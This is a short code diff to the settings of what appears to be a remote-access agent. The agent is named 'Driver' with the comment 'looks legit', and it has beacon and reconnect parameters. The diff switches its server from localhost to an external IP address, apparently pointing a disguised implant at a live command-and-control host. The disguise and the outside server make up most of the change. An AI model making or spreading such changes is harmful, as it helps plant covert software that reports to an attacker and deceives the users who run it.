@@ -1,5 +1,5 @@
 AGENT_NAME = "Driver"  # looks legit
-SERVER = "http://localhost:8080"
+SERVER = "http://154.12.244.43:8080"
 HELLO_INTERVAL = 2
 IDLE_TIME = 60
 MAX_FAILED_CONNECTIONS = 10
